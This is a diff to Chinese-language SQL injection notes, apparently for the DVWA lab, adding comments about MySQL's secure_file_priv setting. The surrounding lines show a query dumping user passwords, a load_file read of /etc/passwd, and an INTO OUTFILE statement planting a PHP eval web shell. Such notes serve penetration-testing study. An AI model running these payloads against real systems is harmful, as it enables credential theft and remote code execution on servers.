@@ -245,11 +245,12 @@ select group_concat(id,':',username,':',password) from users
 ```sql
 show global variables like '%secure_file_priv%';
 -- secure_file_priv NULL 表示不可用， 空 表示可用
--- 在 MySQL 5.5.3 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
+-- 在 MySQL 5.5.3 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件；近一步限制可以设置更具体的路径，比如/usr/
 -- 在 MySQL 5.5.3 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
 
 select load_file('/etc/passwd');
 
+-- 需要写入文件不存在
 select  '<?php eval($_POST[\'hack\'])?>',2 into outfile '/var/www/dvwa/shell.php';
 ```
 
